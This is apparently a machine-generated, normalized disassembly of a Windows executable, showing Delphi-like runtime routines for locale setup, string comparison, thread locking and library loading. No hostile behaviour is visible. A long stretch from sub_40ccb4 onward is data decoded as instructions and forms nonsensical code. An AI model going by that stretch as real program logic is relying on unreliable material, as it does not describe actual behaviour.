mov edx ebx
mov eax edi
call sub_40beac
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40beac
dec eax
mov ebx eax
sub_40bd84
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404250
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40bcf4
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404250
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40bde8
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404250
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404250
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40bcf4
mov eax esi
call sub_404250
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404250
mov [ esp ] eax
jmp r-xdata
sub_40be70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404450
add eax esi
dec eax
call sub_40be48
sub_40beac
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404450
add eax ebx
dec eax
call sub_40be48
add eax ebx
sub_40bee8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404450
push eax
mov eax esi
call sub_404450
mov ebp eax
mov eax ebp
pop edx
call sub_40bf20
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40bf20
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_40833c
mov [ esp ] eax
mov eax ebp
call sub_40833c
mov edi eax
mov edx ebp
mov eax esi
call sub_4084d4
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40bc5c
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_4084d4
mov ebx eax
inc ebx
sub_40bfc0
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40bfe8
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40bfe8
test eax eax
jne r-xdata
sub_40bfe8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4084c0
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40bc5c
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_4084c0
mov edi eax
test edi edi
jne r-xdata
sub_40c028
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c08c
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404200
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_407ecc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c093
lea eax [ ebp - 0xc ]
call sub_403f90
retn
sub_40c09c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c028
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c114
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c0fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c09c
pop ecx
push ebp
call sub_40c09c
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402d88
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c288
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c553
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c114
call sub_40ab78
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40aac8
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403fe4
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40aac8
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_407ecc
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40aac8
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_407ecc
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40ab14
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40ab14
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40aac8
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_407ecc
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40ab14
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40aac8
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40ae00
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403fe4
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40aac8
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40ae00
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403fe4
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40ab14
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40aac8
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403fe4
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40aac8
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403fe4
lea eax [ ebp - 0x8 ]
call sub_403f90
lea eax [ ebp - 0xc ]
call sub_403f90
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40aac8
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_407ecc
test eax eax
jne r-xdata
call sub_40ad50
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404028
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404028
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404310
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404310
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40ab14
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c55a
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403fb4
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40aac8
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_407ecc
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40aac8
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_407ecc
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404028
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404028
jmp r-xdata
sub_40c608
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40c698
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40aa7c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c69f
lea eax [ ebp - 0x14 ]
call sub_403f90
retn
sub_40c6f0
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4082c8
mov [ rw-data ] eax
sub_40c774
push ebx
push esi
push edi
push ebp
call sub_4035cc
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026dc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403248
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035b4
sub_40c7dc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40c7c4
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40c864
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_4079e8
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40c764
mov [ ebp ] eax
sub_40c864
push ebx
mov ebx eax
mov eax ebx
call sub_40c7c4
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40c764
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40c8a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_40c918
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_40c9a4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403258
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_40c9a4
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40c960
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40c7dc
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40c76c
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40c74c
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40c76c
test eax eax
je r-xdata
mov eax edi
call sub_40c960
test bl bl
je r-xdata
mov eax edi
call sub_40c994
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40c74c
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40c758
sub_40ca40
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c7dc
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40c76c
mov eax ebx
call sub_40c978
mov eax ebx
call sub_40c96c
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c854
sub_40ca90
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40c7dc
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40c984
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40c758
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40c74c
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40c984
mov eax esi
call sub_40c978
sub_40cafc
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c7dc
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c854
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40c74c
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40c978
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40c978
sub_40cb74
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40cb98
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40cc0f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4055cc
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_40330c
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cc16
lea eax [ ebp - 0x4 ]
call sub_4055cc
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_40330c
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40cb74
test al al
jne r-xdata
mov al 0x1
sub_40cc30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40cca2
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40cc84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404450
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cc8b
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40ccb4
sbb eax 0x4000000
jae r-xdata
jb r-xdata
add [ eax - 0x7f ] ch
inc esi
add ah bh
jb r-xdata
jb r-xdata
add [ eax ] cl
add [ esi ] rw-data
dec esp
add [ esi ] 0xac
jb r-xdata
add [ eax - 0xbffb980 ] dl
jb r-xdata
jb r-xdata
add [ edx + eax * 4 + 0x726c0046 ] al
inc esi
jb r-xdata
add [ eax + eax * 4 + 0x46 ] dl
jb r-xdata
add [ edx + esi * 2 - 0x7db3ffba ] ah
inc esi
add [ eax + eax * 4 + 0x46 ] cl
add [ edx + esi * 2 - 0x7fabffba ] ch
inc esi
jb r-xdata
add [ eax ] bl
jg r-xdata
jg r-xdata
add [ eax - 0x7e ] cl
inc esi
add [ edx + esi * 2 ] ah
inc esi
add [ eax ] al
add [ edx + esi * 2 ] dl
inc esi
add [ eax + 0x4681 ] ah
add [ eax ] al
add [ eax ] dl
add [ edi + edi * 2 + 0x46 ] ch
add [ edx + esi * 2 + 0x46 ] al
add [ eax ] al
add [ edx + esi * 2 ] bl
inc esi
add [ eax ] dh
add [ edx + eax * 4 + 0x46 ] dl
add [ edx + esi * 2 + 0x46 ] bl
jb r-xdata
add [ eax + eax * 4 + 0x46 ] ah
add [ edx + esi * 2 + 0x46 ] ah
add [ esi ] 0xa4
add ah ch
jb r-xdata
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jb r-xdata
add [ edi + edi * 2 ] ah
inc esi
add [ eax ] al
jno r-xdata
add al bh
jle r-xdata
add [ eax ] al
add [ edx + esi * 2 ] cl
inc esi
add ah ch
jle r-xdata
jb r-xdata
add [ eax - 0x80 ] ah
inc esi
add [ eax ] ch
jb r-xdata
add [ edx + esi * 2 - 0x7fafffba ] bl
add [ edx + eax * 4 + 0x46 ] cl
jb r-xdata
add [ eax - 0x1bffb97f ] dh
jb r-xdata
jno r-xdata
add [ edi + edi * 2 + 0x46 ] bh
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] al
inc esi
add [ edi + edi * 2 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
jno r-xdata
add [ eax + eax * 4 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add ah bh
jno r-xdata
jno r-xdata
add [ eax + 0x467f ] al
jg r-xdata
add [ eax ] al
jb r-xdata
add [ edx + esi * 2 ] ch
inc esi
add [ esi ] 0x0
add [ eax ] al
add [ eax ] bl
add [ eax - 0x7e ] ah
inc esi
add [ edx + esi * 2 + 0x46 ] dl
jb r-xdata
add al ah
add [ esi ] rw-data
mov esp 0xd400467f
jb r-xdata
jno r-xdata
add ah bl
add [ esi ] 0x0
in al dx
jno r-xdata
jno r-xdata
add [ eax - 0x7f ] bl
inc esi
add [ eax ] al
add [ eax ] al
add ah ah
jno r-xdata
add [ ecx + eax * 4 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add al bh
jno r-xdata
add al bh
jno r-xdata
add [ ecx + eax * 4 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add al dh
jg r-xdata
add [ eax ] al
add ah dh
add [ eax ] al
jno r-xdata
add [ edi + edi * 2 + 0x46 ] al
add [ eax ] al
or [ edx + 0x46 ] dh
jb r-xdata
inc esi
add [ edx + esi * 2 - 0x7d43ffba ] dl
inc esi
add [ edx + esi * 2 - 0x7ebfffba ] cl
add [ eax - 0x80 ] dl
jb r-xdata
add [ eax - 0x80 ] bh
inc esi
add ah cl
jb r-xdata
jno r-xdata
add al cl
add [ esi ] 0x0
aam 0x71
inc esi
jno r-xdata
add ah cl
add [ esi ] 0x0
call 0x584114b6
add [ esi ] 0x0
in al 0x71
inc esi
jno r-xdata
add ah ah
jg r-xdata
jno r-xdata
add [ eax - 0x80 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add al ah
jno r-xdata
add [ eax ] ch
add [ esi ] 0x0
les esi [ ecx + 0x46 ]
add [ eax ] al
add [ eax ] al
add ah bl
jno r-xdata
add ah dh
jle r-xdata
jb r-xdata
add [ eax + 0x4c00467f ] ch
jb r-xdata
jb r-xdata
inc esi
add [ edx + esi * 2 - 0x7edfffba ] al
inc esi
add [ edx + esi * 2 + 0x46 ] bh
add [ eax - 0x7f ] al
jb r-xdata
add al ah
jle r-xdata
jno r-xdata
add [ eax ] ah
add [ esi ] 0x0
add [ eax ] al
add [ ecx + esi * 2 + 0x7ef00046 ] bh
inc esi
jno r-xdata
add al ch
add [ esi ] 0x0
add [ eax ] al
add al dl
jno r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004671 ] dh
add [ eax + eax * 4 + 0x46 ] al
add [ eax ] al
mov ah 0x71
inc esi
add [ esi ] 0x0
add [ eax ] al
add [ ecx + esi * 2 - 0x7d97ffba ] dh
add [ eax ] al
add [ eax ] al
add ah cl
jno r-xdata
add al al
add [ esi ] 0x0
add [ eax ] al
add al cl
jno r-xdata
add [ esi ] 0x0
add [ eax ] al
add [ ecx + esi * 2 - 0x7eefffba ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x5bffb98f ] ch
jg r-xdata
add [ eax ] bl
jno r-xdata
add ah dl
add [ esi ] 0x0
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add al bl
add [ esi ] 0x0
adc [ edx + 0x46 ] dh
add [ ecx + eax * 4 ] bl
inc esi
add [ edx + esi * 2 ] bh
inc esi
jb r-xdata
add [ eax ] ah
add [ esi ] rw-data
rol [ edx + 0x72740046 ] 0x1
inc esi
add ah al
jb r-xdata
jno r-xdata
add [ edi + edi * 2 + 0x46 ] ah
add [ eax ] al
movsb [ edi ] [ esi ]
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x7f040046 ] ah
jno r-xdata
add al dh
jle r-xdata
jno r-xdata
add [ esi ] 0x0
add [ eax ] al
add [ ecx + esi * 2 - 0x7d0bffba ] bl
inc esi
add [ eax ] al
add [ eax ] cl
jno r-xdata
add [ eax - 0x7e ] ch
jno r-xdata
add [ edi + edi * 2 + 0x46 ] al
jno r-xdata
add [ eax ] dl
add [ esi ] 0x0
test al 0x71
inc esi
jb r-xdata
add [ eax + 0x34004681 ] ch
jb r-xdata
add ah al
add [ esi ] 0xbc
inc [ rw-data ]
jne r-xdata
xor [ ecx + ecx * 4 + 0x20 ] ah
add [ eax ] al
add [ ecx + esi * 2 - 0x7ef3ffba ] cl
add [ eax - 0x7e ] al
inc esi
add [ eax ] al
jno r-xdata
inc esi
add [ edi + edi * 2 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d100
retn
mov eax rw-data
jg r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x7edc0046 ] dl
inc esi
jg r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x7bffb98f ] bh
add [ edx + eax * 4 + 0x46 ] bl
add [ eax ] al
jno r-xdata
jno r-xdata
add [ eax ] al
add [ eax + 0x44004671 ] bl
jg r-xdata
add ah dh
add [ esi ] 0x0
pushfd
mov ah 0x40
add al ch
inc edx
jpe r-xdata
add [ eax + 0x467f ] dh
xor eax eax
mov ebp esp
add ah bl
jle r-xdata
jb r-xdata
add al dl
add [ esi ] 0x74
call sub_40cb64
call sub_40c6d0
call sub_40b9c4
dec edx
add [ eax ] eax
add [ eax + rw-data ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x63ffb98f ] cl
add [ esi ] 0x0
add [ eax ] al
add [ ecx + esi * 2 + 0x46 ] ah
add [ ecx + eax * 4 ] cl
call sub_404a0c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
call sub_403f90
mov eax rw-data
mov edx [ r-xdata ]
call sub_404f20
mov eax rw-data
mov edx [ r-xdata ]
call sub_404f20
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
call sub_403f90
mov eax rw-data
call sub_403f90
mov eax rw-data
call sub_403f90
mov eax rw-data
call sub_403f90
mov eax rw-data
call sub_403f90
mov eax rw-data
call sub_403f90
mov eax rw-data
call sub_403f90
mov eax rw-data
call sub_403f90
mov eax rw-data
call sub_404670
mov eax rw-data
call sub_403f90
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add [ eax ] al
add [ esi ] 0x0
mov [ ecx + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004671 ] ah
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40b49c ]
add [ eax + eax * 4 + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax + 0x71 ] ah
inc esi
push ebp
push sub_40d0f9
push [ fs : eax ]
mov [ fs : eax ] esp
